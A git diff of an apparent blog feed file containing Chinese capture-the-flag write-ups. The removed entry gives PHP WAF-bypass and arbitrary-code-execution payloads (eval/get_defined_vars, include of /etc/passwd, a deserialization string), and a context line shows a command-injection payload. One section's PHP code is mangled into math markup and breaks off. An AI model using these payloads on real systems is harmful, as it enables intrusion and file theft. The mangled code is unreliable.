+        <category term="php原生类利用" />
         <category term="md5()和sha1()对类进行hash 触发__toString方法" />
         <updated>2024-07-28T14:19:51.000Z</updated>
     </entry>
@@ -7020,8 +7037,8 @@ cannot open `&#39; (No such file or directory) cannot open `&#39; (No such file 
 &lt;p&gt;可以看到这里很清楚了，也就是在我们传的参数两边套上了双引号然后，拼接到 cmd 的后面这时考虑到引号闭合就好了直接上 payload&lt;/p&gt;
 &lt;figure class=&#34;highlight ruby&#34;&gt;&lt;figcaption data-lang=&#34;ruby&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;?&lt;/span&gt;comm1&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;index&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;php&lt;span class=&#34;token string-literal&#34;&gt;&lt;span class=&#34;token string&#34;&gt;&#34;;dir /;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;comm2&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;?&lt;/span&gt;comm1&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;index&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;php&lt;span class=&#34;token string-literal&#34;&gt;&lt;span class=&#34;token string&#34;&gt;&#34;;tac /f*;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;comm2&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;直接出 flag&lt;/p&gt;
 </content>
-        <category term="buuctf" />
         <category term="system_file" />
+        <category term="buuctf" />
         <updated>2024-07-26T14:15:52.000Z</updated>
     </entry>
     <entry>
@@ -9672,237 +9689,6 @@ nmap -T5 -sT -Pn --host-timeout 2 -F host -T&lt;0-5&gt; : 速度/时间模板参
 </content>
         <category term="buuctf" />
         <updated>2024-04-28T14:48:29.000Z</updated>
-    </entry>
-    <entry>
-        <id>http://odiws.github.io/2024/04/28/3-txt/</id>
-        <title>buuctf4月27日</title>
-        <link rel="alternate" href="http://odiws.github.io/2024/04/28/3-txt/"/>
-        <content type="html">&lt;h2 id=&#34;roarctf-2019easy-calc&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#roarctf-2019easy-calc&#34;&gt;#&lt;/a&gt; [RoarCTF 2019]Easy Calc&lt;/h2&gt;
-&lt;h3 id=&#34;在这里插入图片描述&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#在这里插入图片描述&#34;&gt;#&lt;/a&gt; &lt;img data-src=&#34;https://img-blog.csdnimg.cn/direct/8d7e93faf78343328ec17a90191c6c8b.png#pic_center&#34; alt=&#34;在这里插入图片描述&#34;&gt;&lt;/h3&gt;
-&lt;p&gt;页面发现什么也没有 F12 发现有 calc.php 这个文件，进去发现有源码&lt;/p&gt;
-&lt;?php 
-error_reporting(0); 
-if(!isset($_GET[&#39;num&#39;])){   
-	show_source(__FILE__); 
-}else{     
-	$str = $_GET[&#39;num&#39;];     
-	$blacklist = [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&#34;&#39;, &#39;`&#39;, &#39;\[&#39;, &#39;\]&#39;,&#39;\$&#39;,&#39;\\&#39;,&#39;\^&#39;];     
-	foreach ($blacklist as $blackitem) {         
-		if (preg_match(&#39;/&#39; . $blackitem . &#39;/m&#39;, $str)) {             
-			die(&#34;what are you want to do?&#34;);         
-		}     
-	}     
-	eval(&#39;echo &#39;.$str.&#39;;&#39;); 
-} 
-?&gt; 
-&lt;p&gt;写 num=system (‘ls’); 发现不允许，首页面有一个提示是有 waf 保护，&lt;/p&gt;
-&lt;p&gt;可能是不能写参数&lt;/p&gt;
-&lt;h3 id=&#34;知识点1空格绕过-waf&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#知识点1空格绕过-waf&#34;&gt;#&lt;/a&gt; 知识点 1：空格绕过 waf&lt;/h3&gt;
-&lt;p&gt;在 num 参数前加上一个空格，即：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL25vZGU0LmJ1dW9qLmNuOjI5NzgwL2NhbGMucGhw&#34;&gt;node4.buuoj.cn:29780/calc.php&lt;/span&gt;? num=system(‘ls’);&lt;/p&gt;
-&lt;p&gt;返回结果：&lt;/p&gt;
-&lt;p&gt;这样服务器会认为传入的参数是 空格 num ，而不是 num 。这里用到这种绕过方式是因为假定服务器只对 num 参数做检测，而对于其他参数不做检测。&lt;/p&gt;
-&lt;p&gt;当 空格 num 参数传入到后端，被 PHP 代码处理时，会被去除多余空格及特殊字符：如空格、制表符、回车换行符以及某些特殊字符等。这样一来仍然是 num 参数了。&lt;/p&gt;
-&lt;h4 id=&#34;payloadcalcphp-numvar_dumpscandircurrentlocaleconv&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#payloadcalcphp-numvar_dumpscandircurrentlocaleconv&#34;&gt;#&lt;/a&gt; payload:calc.php? num=var_dump(scandir(current(localeconv())));&lt;/h4&gt;
-&lt;p&gt;查看当前目录下的文件&lt;br&gt;
- localeconv () 函数返回当前设置的地区的格式化信息，包括货币符号、小数点符号等。它返回一个数组，其中包含了与当前地区相关的格式化参数，该函数返回的第一个元素的值通常是小数点 “.” 。&lt;br&gt;
-current () 函数用于获取数组中的当前元素的值。在这里，它用于获取 localeconv () 函数返回的数组的第一个元素的值，即一个小数点。&lt;br&gt;
-scandir () 函数用于获取指定目录中的文件和文件夹列表。它接受一个路径作为参数，并返回一个包含指定目录中所有文件和文件夹的数组。scandir (&amp;quot;.&amp;quot;) 表示获取当前目录下的文件列表。&lt;br&gt;
-最后使用 var_dump () 函数将该列表输出到页面上。&lt;/p&gt;
-&lt;p&gt;但其实这里可以更简单：&lt;/p&gt;
-&lt;h4 id=&#34;calcphp-numvar_dumpscandirchr46&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#calcphp-numvar_dumpscandirchr46&#34;&gt;#&lt;/a&gt; calc.php? num=var_dump(scandir(chr(46)));&lt;/h4&gt;
-&lt;p&gt;46 是 “.” 的 ASCII 码值，返回结果：&lt;/p&gt;
-&lt;p&gt;因为可以有参数嘛。用 chr () 函数将数字变为字符。&lt;/p&gt;
-&lt;h4 id=&#34;同理查看根目录下的文件calcphp-numvar_dumpscandirchr47&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#同理查看根目录下的文件calcphp-numvar_dumpscandirchr47&#34;&gt;#&lt;/a&gt; 同理查看根目录下的文件：calc.php? num=var_dump (scandir (chr (47)));&lt;/h4&gt;
-&lt;p&gt;47 是 “/” 的 ASCII 码值&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/direct/50e93170372c4fbf9e09ad41d6f5909d.png#pic_center&#34; alt=&#34;在这里插入图片描述&#34;&gt;&lt;/p&gt;
-&lt;p&gt;找到 /f1aag 这个文件&lt;/p&gt;
-&lt;p&gt;查看 /f1agg 文件&lt;/p&gt;
-&lt;h4 id=&#34;numfile_get_contentschr47chr102chr49chr97chr103chr103&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#numfile_get_contentschr47chr102chr49chr97chr103chr103&#34;&gt;#&lt;/a&gt; num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103));&lt;/h4&gt;
-&lt;h3 id=&#34;知识点2file_get_contents-函数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#知识点2file_get_contents-函数&#34;&gt;#&lt;/a&gt; 知识点 2.file_get_contents () 函数&lt;/h3&gt;
-&lt;p&gt;把整个文件读入一个字符串中。&lt;/p&gt;
-&lt;p&gt;chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)&lt;/p&gt;
-&lt;p&gt;分别是 ‘/’ ‘f’ ‘1’ ‘a’ ‘g’ ‘g’ 的 ASCII 值转字符，‘.’ 用作字符串连接。每一个 chr () 函数返回的结果由于是字符，所以自带了一对引号，不需要额外再加。&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/direct/7aacafeccdf94541a6b70abbb639c728.png#pic_center&#34; alt=&#34;在这里插入图片描述&#34;&gt;&lt;/p&gt;
-&lt;h3 id=&#34;知识点3url溢出&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#知识点3url溢出&#34;&gt;#&lt;/a&gt; 知识点 3.url 溢出&lt;/h3&gt;
-&lt;p&gt;? num=1;eval(end(pos(get_defined_vars())))&amp;amp;nss=phpinfo();&amp;amp;&lt;/p&gt;
-&lt;p&gt;get_defined_vars ()：返回由所有已定义变量所组成的数组，会返回 _GET , _POST , _COOKIE , _FILES 全局变量的值，返回数组顺序为 get-&amp;gt;post-&amp;gt;cookie-&amp;gt;files 。&lt;/p&gt;
-&lt;p&gt;current ()：返回数组中的当前单元，初始指向插入到数组中的第一个单元，也就是会返回 $_GET 变量的数组值。&lt;/p&gt;
-&lt;p&gt;end () : 将内部指针指向数组中的最后一个元素，并输出。即新加入的参数 nss 。&lt;/p&gt;
-&lt;p&gt;最后由 eval () 函数执行，使得 get 方式的参数 nss 生效。&lt;/p&gt;
-&lt;p&gt;这样的话就可以再利用 nss 传参了，由于代码只对 num 参数的值做了过滤，因此 nss 参数理论上可以造成任意代码执行。&lt;/p&gt;
-&lt;p&gt;这样可以看到 phpinfo，找到 disable_function 函数&lt;/p&gt;
-&lt;h4 id=&#34;查看-etcpasswd-文件&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#查看-etcpasswd-文件&#34;&gt;#&lt;/a&gt; 查看 /etc/passwd 文件&lt;/h4&gt;
-&lt;pre&gt;&lt;code&gt;? num=1;eval(end(pos(get_defined_vars())))&amp;amp;nss=include(&amp;quot;/etc/passwd&amp;quot;);
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;输出结果：&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/direct/3e1382cdd0e14e2ab9a8582e68920b4f.png#pic_center&#34; alt=&#34;在这里插入图片描述&#34;&gt;&lt;/p&gt;
-&lt;h3 id=&#34;知识点4http请求走私&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#知识点4http请求走私&#34;&gt;#&lt;/a&gt; 知识点 4.http 请求走私&lt;/h3&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/direct/da31f71647244b56aad12e09678180b5.png#pic_center&#34; alt=&#34;在这里插入图片描述&#34;&gt;&lt;/p&gt;
-&lt;p&gt;大致原理就是使用了两个 Content-Length 头，使得前端无法识别，直接将整个包完全发给了后端。但这样还是要接受后端的黑名单过滤，所以 num 传参还是不能为所欲为。&lt;/p&gt;
-&lt;h2 id=&#34;hctf-2018admin-1&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#hctf-2018admin-1&#34;&gt;#&lt;/a&gt; [HCTF 2018]admin 1&lt;/h2&gt;
-&lt;p&gt;&lt;strong&gt;第一种解法：密码爆破 - 尝试弱口令&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;[BUUCTF-&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2OTE4Mjc5L2FydGljbGUvZGV0YWlscy8xMjEyOTQ5MTU=&#34;&gt;HCTF 2018] admin1_[hctf 2018] admin 1-CSDN 博客&lt;/span&gt;&lt;/p&gt;
-&lt;p&gt;三种方法不太理解。&lt;/p&gt;
-&lt;h2 id=&#34;zjctf-2019nizhuansiwei&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#zjctf-2019nizhuansiwei&#34;&gt;#&lt;/a&gt; [ZJCTF 2019]NiZhuanSiWei&lt;/h2&gt;
-&lt;h3 id=&#34;image-20240426180112007&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#image-20240426180112007&#34;&gt;#&lt;/a&gt; &lt;img data-src=&#34;C:%5CUsers%5C86182%5CDesktop%5CmyBlog%5Cassets%5Cimage-20240426180112007.png&#34; alt=&#34;image-20240426180112007&#34;&gt;&lt;/h3&gt;
-&lt;h4 id=&#34;1先要把welcome-to-the-zjctf从text中读出来&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1先要把welcome-to-the-zjctf从text中读出来&#34;&gt;#&lt;/a&gt; 1. 先要把 “welcome to the zjctf” 从 $text 中读出来&lt;/h4&gt;
-&lt;p&gt;?text=data://text/plain,welcome to the zjctf&lt;/p&gt;
-&lt;p&gt;2.$file 不能是含有 flag, 有一个文件 include () 函数可以先写 php 伪协议读一下，（因为 password 还不知道要干嘛，password 有 unserialize (), 可以初步判断是反序列化，直接输出，可以看出是__tostring 函数这个魔术方法（将这个对象当成字符串输出））&lt;/p&gt;
-&lt;p&gt;3.&amp;lt;?php&lt;/p&gt;
-&lt;p&gt;class Flag{  &lt;a href=&#34;//flag.php&#34;&gt;//flag.php&lt;/a&gt;&lt;br&gt;
-public file;  
-    public function __tostring(){  
-        if(isset(this-&amp;gt;file)){&lt;br&gt;
-echo file_get_contents($this-&amp;gt;file);&lt;br&gt;
-echo “&lt;br&gt;”;&lt;br&gt;
-return (“U R SO CLOSE !///COME ON PLZ”);&lt;br&gt;
-}&lt;br&gt;
-}&lt;br&gt;
-}&lt;br&gt;
-?&amp;gt; useless.php 里的文件内容，可以发现是一个对象，可以用 password=&lt;em&gt;O:4:“Flag”:1:{s:4:“file”;s:8:“flag.php”;}&lt;/em&gt;&lt;/p&gt;
-&lt;p&gt;绕过&lt;/p&gt;
-&lt;p&gt;最后的 payload:&lt;/p&gt;
-&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;?&lt;/span&gt;text&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;data&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;//text/plain,welcome to the zjctf&amp;amp;file=useless.php&amp;amp;password=O:4:&#34;Flag&#34;:1:&amp;#123;s:4:&#34;file&#34;;s:8:&#34;flag.php&#34;;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;mrctf2020ez_bypass&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#mrctf2020ez_bypass&#34;&gt;#&lt;/a&gt; [MRCTF2020]Ez_bypass&lt;/h2&gt;
-&lt;p&gt;&lt;img data-src=&#34;C:%5CUsers%5C86182%5CDesktop%5CmyBlog%5Cassets%5Cimage-20240426182327414.png&#34; alt=&#34;image-20240426182327414&#34;&gt;&lt;/p&gt;
-&lt;p&gt;I put something in F12 for you&lt;br&gt;
-include ‘flag.php’;&lt;br&gt;
-&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;g&lt;/mi&gt;&lt;msup&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mo mathvariant=&#34;normal&#34; lspace=&#34;0em&#34; rspace=&#34;0em&#34;&gt;′&lt;/mo&gt;&lt;/msup&gt;&lt;mi&gt;M&lt;/mi&gt;&lt;mi&gt;R&lt;/mi&gt;&lt;mi&gt;C&lt;/mi&gt;&lt;mi&gt;T&lt;/mi&gt;&lt;mi&gt;F&lt;/mi&gt;&lt;msup&gt;&lt;mrow&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;/mrow&gt;&lt;mo mathvariant=&#34;normal&#34; lspace=&#34;0em&#34; rspace=&#34;0em&#34;&gt;′&lt;/mo&gt;&lt;/msup&gt;&lt;mo separator=&#34;true&#34;&gt;;&lt;/mo&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mo stretchy=&#34;false&#34;&gt;(&lt;/mo&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mo stretchy=&#34;false&#34;&gt;(&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;flag=&amp;#x27;MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}&amp;#x27;;
-if(isset(&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.946332em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.03588em;&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.751892em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;′&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.001892em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.10903em;&#34;&gt;M&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.00773em;&#34;&gt;R&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.07153em;&#34;&gt;C&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.13889em;&#34;&gt;T&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.13889em;&#34;&gt;F&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;x&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.751892em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;′&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;_GET[‘gg’])&amp;amp;&amp;amp;isset($_GET[‘id’])) {&lt;br&gt;
-&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;id=&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.69444em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;_GET[‘id’];&lt;br&gt;
-&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;g&lt;/mi&gt;&lt;mi&gt;g&lt;/mi&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;gg=&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.625em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.03588em;&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.03588em;&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;_GET[‘gg’];&lt;br&gt;
-if (md5(&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mo stretchy=&#34;false&#34;&gt;)&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mn&gt;5&lt;/mn&gt;&lt;mo stretchy=&#34;false&#34;&gt;(&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;id) === md5(&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.36687em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.36687em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span 